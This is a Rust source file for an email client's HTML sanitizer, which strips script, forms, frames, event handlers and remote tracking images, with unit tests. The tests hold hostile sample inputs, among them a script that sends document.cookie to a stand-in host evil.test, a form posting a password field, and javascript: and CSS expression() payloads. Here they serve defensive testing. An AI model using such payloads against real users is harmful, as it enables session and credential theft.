//! HTML sanitization for the reading pane.
//!
//! An HTML mail body is attacker-controlled markup that we are about to render. This is the layer
//! that decides it cannot run script, cannot phone home, and cannot escape the frame it is drawn
//! in (PLAN.md §7.3, §7.4).
//!
//! Two defences, deliberately overlapping: this sanitizer, and the strict CSP plus sandboxed
//! iframe the UI renders the result into. Either alone would be adequate on a good day; the point
//! is not to need a good day.

use std::collections::{HashMap, HashSet};

use ammonia::Builder;

#[derive(Debug, Clone)]
pub struct SanitizedHtml {
    pub html: String,
    /// True when at least one remote reference was stripped — what drives the
    /// "this message tried to load remote content" banner.
    pub had_remote_content: bool,
}

/// Sanitize an HTML body.
///
/// With `allow_remote` false (the default for every message), remote images and other external
/// references are removed. That is the single most effective anti-tracking-pixel measure there
/// is, and it is what Outlook does too. The user can re-render one message with `allow_remote`
/// true after deciding they trust the sender.
///
/// Script, forms, iframes, objects and event handlers are removed in **both** modes. "Show
/// images" is a decision about privacy, never about code execution.
pub fn sanitize(html: &str, allow_remote: bool) -> SanitizedHtml {
    let blocked = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let seen = blocked.clone();

    let mut tags: HashSet<&str> = [
        "a",
        "abbr",
        "b",
        "blockquote",
        "br",
        "caption",
        "center",
        "cite",
        "code",
        "col",
        "colgroup",
        "dd",
        "del",
        "div",
        "dl",
        "dt",
        "em",
        "figcaption",
        "figure",
        "font",
        "h1",
        "h2",
        "h3",
        "h4",
        "h5",
        "h6",
        "hr",
        "i",
        "img",
        "ins",
        "kbd",
        "li",
        "mark",
        "ol",
        "p",
        "pre",
        "q",
        "s",
        "samp",
        "small",
        "span",
        "strike",
        "strong",
        "sub",
        "sup",
        "table",
        "tbody",
        "td",
        "tfoot",
        "th",
        "thead",
        "tr",
        "u",
        "ul",
        "wbr",
    ]
    .into_iter()
    .collect();
    // Not in the list, and worth being explicit about: script, style, iframe, object, embed,
    // form, input, button, link, meta, base, svg, math.
    tags.remove("script");

    let mut attrs: HashMap<&str, HashSet<&str>> = HashMap::new();
    attrs.insert("a", ["href", "title"].into_iter().collect());
    attrs.insert(
        "img",
        ["src", "alt", "title", "width", "height"]
            .into_iter()
            .collect(),
    );
    attrs.insert("td", ["colspan", "rowspan", "align"].into_iter().collect());
    attrs.insert("th", ["colspan", "rowspan", "align"].into_iter().collect());
    attrs.insert("table", ["width", "align", "border"].into_iter().collect());
    attrs.insert("font", ["color", "size", "face"].into_iter().collect());
    for tag in ["div", "span", "p", "td", "th", "table", "tr"] {
        attrs
            .entry(tag)
            .or_default()
            .extend(["align", "bgcolor"]);
    }
    for tag in ["td", "th", "tr"] {
        attrs.entry(tag).or_default().extend(["valign", "width", "height"]);
    }

    let mut builder = Builder::default();
    // `style` on every element, because marketing and transactional mail puts all of its layout
    // there — a button is an `<a>` with padding and a colour, and without them it is bare blue
    // text. Ammonia passes the value through untouched, so [`clean_style`] is what keeps
    // `url()` (remote loads) and legacy script hooks out.
    builder.add_generic_attributes(["style", "class"]);

    builder
        .tags(tags)
        .tag_attributes(attrs)
        .link_rel(Some("noopener noreferrer nofollow"))
        // Anything not listed here — javascript:, vbscript:, data:, file: — is dropped.
        .url_schemes(["http", "https", "mailto", "cid"].into_iter().collect())
        .attribute_filter(move |element, attribute, value| {
            if element == "img" && attribute == "src" {
                let remote = is_remote(value);
                if remote {
                    seen.store(true, std::sync::atomic::Ordering::Relaxed);
                    if !allow_remote {
                        return None;
                    }
                }
            }
            // `class` survives only as the composer's own quote marker, which a saved draft must
            // keep. Any other class from a stranger's mail could pick up the app's own styles
            // inside the composer.
            if attribute == "class" {
                return (value == "signet-quote").then(|| value.into());
            }
            if attribute == "style" {
                let (style, had_url) = clean_style(value, allow_remote);
                if had_url {
                    seen.store(true, std::sync::atomic::Ordering::Relaxed);
                }
                return Some(style.into());
            }
            Some(value.into())
        });

    let html = builder.clean(html).to_string();
    SanitizedHtml {
        html,
        had_remote_content: blocked.load(std::sync::atomic::Ordering::Relaxed),
    }
}

/// Drop the declarations of an inline style that could load something or run something.
///
/// `url()` is a remote load exactly like an `<img>` (a `background:url(...)` tracking pixel), so
/// it follows the same "Show images" rule and reports itself the same way. `expression()`,
/// `behavior` and `-moz-binding` are old script hooks and never survive. Returns the cleaned
/// style and whether a `url()` was seen.
// ponytail: split on `;` misreads a `;` inside a quoted url; such a declaration is dropped, not
// passed, so the failure mode is a missing background, never a leak.
fn clean_style(style: &str, allow_remote: bool) -> (String, bool) {
    let mut had_url = false;
    let kept: Vec<&str> = style
        .split(';')
        .filter(|decl| {
            let d = decl.to_ascii_lowercase();
            if d.contains("expression(") || d.contains("behavior") || d.contains("-moz-binding") {
                return false;
            }
            if d.contains("url(") {
                had_url = true;
                return allow_remote && !d.contains("javascript:");
            }
            !decl.trim().is_empty()
        })
        .collect();
    (kept.join(";"), had_url)
}

fn is_remote(url: &str) -> bool {
    let u = url.trim().to_ascii_lowercase();
    u.starts_with("http://") || u.starts_with("https://") || u.starts_with("//")
}

/// Flatten HTML to plain text, for the search index and the preview line.
///
/// Not a renderer: it drops markup and keeps the words, which is all the index needs.
pub fn html_to_text(html: &str) -> String {
    let mut out = String::with_capacity(html.len() / 2);
    let mut in_tag = false;
    let mut skip_depth = 0usize;
    let mut tag = String::new();

    for ch in html.chars() {
        match ch {
            '<' => {
                in_tag = true;
                tag.clear();
            }
            '>' => {
                in_tag = false;
                let name = tag.trim_start_matches('/').trim().to_ascii_lowercase();
                let name = name.split_whitespace().next().unwrap_or("").to_string();
                // Never let the contents of these reach the index as if they were prose.
                if matches!(name.as_str(), "script" | "style" | "head" | "title") {
                    if tag.starts_with('/') {
                        skip_depth = skip_depth.saturating_sub(1);
                    } else if !tag.ends_with('/') {
                        skip_depth += 1;
                    }
                }
                if matches!(
                    name.as_str(),
                    "br" | "p" | "div" | "tr" | "li" | "h1" | "h2" | "h3" | "h4" | "h5" | "h6"
                ) {
                    out.push(' ');
                }
            }
            _ if in_tag => tag.push(ch),
            _ if skip_depth > 0 => {}
            _ => out.push(ch),
        }
    }

    decode_entities(&out)
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

fn decode_entities(s: &str) -> String {
    s.replace("&nbsp;", " ")
        .replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&apos;", "'")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn script_is_removed_in_both_modes() {
        let evil = r#"<p>hi</p><script>fetch('http://evil.test/'+document.cookie)</script>"#;
        for allow_remote in [false, true] {
            let out = sanitize(evil, allow_remote);
            assert!(!out.html.contains("<script"), "script survived");
            assert!(!out.html.contains("fetch("), "script body survived");
            assert!(out.html.contains("hi"));
        }
    }

    #[test]
    fn event_handlers_are_stripped() {
        let evil = r#"<div onclick="steal()" onmouseover="x()">text</div>"#;
        let out = sanitize(evil, true);
        assert!(!out.html.contains("onclick"));
        assert!(!out.html.contains("onmouseover"));
        assert!(out.html.contains("text"));
    }

    #[test]
    fn javascript_urls_do_not_survive() {
        let evil = r#"<a href="javascript:alert(1)">click</a>"#;
        let out = sanitize(evil, true);
        assert!(!out.html.contains("javascript:"));
    }

    #[test]
    fn frames_objects_and_forms_are_removed() {
        let evil = r#"<iframe src="http://evil.test"></iframe>
                      <object data="x.swf"></object>
                      <form action="http://evil.test"><input name="pw"></form>"#;
        let out = sanitize(evil, true);
        for tag in ["<iframe", "<object", "<form", "<input"] {
            assert!(!out.html.contains(tag), "{tag} survived: {}", out.html);
        }
    }

    #[test]
    fn remote_images_are_blocked_by_default_and_reported() {
        let tracker = r#"<p>Hello</p><img src="https://tracker.test/pixel.gif?u=42" width="1">"#;

        let blocked = sanitize(tracker, false);
        assert!(
            !blocked.html.contains("tracker.test"),
            "tracking pixel survived: {}",
            blocked.html
        );
        assert!(blocked.had_remote_content, "banner would not be shown");
        assert!(blocked.html.contains("Hello"));

        // The same message re-rendered after the user chooses to trust the sender.
        let allowed = sanitize(tracker, true);
        assert!(allowed.html.contains("tracker.test"));
        assert!(allowed.had_remote_content);
    }

    #[test]
    fn inline_cid_images_are_kept_because_they_are_not_remote() {
        let inline = r#"<img src="cid:logo@example.com" alt="logo">"#;
        let out = sanitize(inline, false);
        assert!(out.html.contains("cid:logo@example.com"));
        // An embedded image tells the sender nothing, so it must not raise the banner.
        assert!(!out.had_remote_content);
    }

    #[test]
    fn protocol_relative_urls_count_as_remote() {
        // `//host/x.gif` inherits the page scheme and is every bit as much a beacon.
        let out = sanitize(r#"<img src="//tracker.test/p.gif">"#, false);
        assert!(!out.html.contains("tracker.test"));
        assert!(out.had_remote_content);
    }

    #[test]
    fn links_get_noopener_and_nofollow() {
        let out = sanitize(r#"<a href="https://example.com">x</a>"#, false);
        assert!(out.html.contains("noopener"));
        assert!(out.html.contains("nofollow"));
    }

    #[test]
    fn ordinary_formatting_survives_intact() {
        let mail = r#"<div style="color:#333"><p><b>Bold</b> and <i>italic</i></p>
                      <table><tr><td>cell</td></tr></table>
                      <a href="https://example.com/report">report</a></div>"#;
        let out = sanitize(mail, false);
        for fragment in [
            "<b>",
            "<i>",
            "<table",
            "<td",
            "href=\"https://example.com/report\"",
        ] {
            assert!(out.html.contains(fragment), "lost {fragment}: {}", out.html);
        }
    }

    #[test]
    fn a_styled_link_keeps_its_button_look() {
        // Transactional mail draws its buttons as a padded, coloured `<a>`. Stripping the style
        // left bare blue text on a dark cell.
        let mail = r##"<table><tr><td bgcolor="#141413" style="border-radius:20px"><a href="https://x.test"
            style="color: white; display: inline-block; padding: 14px 36px;">Sign in</a></td></tr></table>"##;
        let out = sanitize(mail, false);
        assert!(out.html.contains("padding: 14px 36px"), "{}", out.html);
        assert!(out.html.contains("color: white"), "{}", out.html);
        assert!(out.html.contains("border-radius:20px"), "{}", out.html);
    }

    #[test]
    fn a_css_background_url_is_a_remote_load_like_any_image() {
        let mail = r#"<div style="color:red;background:url(https://tracker.test/p.gif)">x</div>"#;

        let blocked = sanitize(mail, false);
        assert!(!blocked.html.contains("tracker.test"), "{}", blocked.html);
        assert!(blocked.html.contains("color:red"), "{}", blocked.html);
        assert!(blocked.had_remote_content, "banner would not be shown");

        assert!(sanitize(mail, true).html.contains("tracker.test"));
    }

    #[test]
    fn css_script_hooks_never_survive() {
        let evil = r#"<p style="width:expression(alert(1));color:red">x</p>"#;
        let out = sanitize(evil, true);
        assert!(!out.html.contains("expression"), "{}", out.html);
        assert!(out.html.contains("color:red"));
    }

    #[test]
    fn html_to_text_drops_markup_and_script_contents() {
        let html = r#"<html><head><title>T</title><style>p{color:red}</style></head>
                      <body><p>Hello</p><script>var secret=1</script><p>world</p></body></html>"#;
        let text = html_to_text(html);
        assert!(text.contains("Hello"));
        assert!(text.contains("world"));
        assert!(
            !text.contains("secret"),
            "script body reached the index: {text}"
        );
        assert!(!text.contains("color:red"), "css reached the index: {text}");
        assert!(!text.contains('<'));
    }

    #[test]
    fn html_to_text_decodes_entities_and_separates_blocks() {
        let text = html_to_text("<p>a&nbsp;&amp;&nbsp;b</p><p>c</p>");
        assert_eq!(text, "a & b c");
    }
}
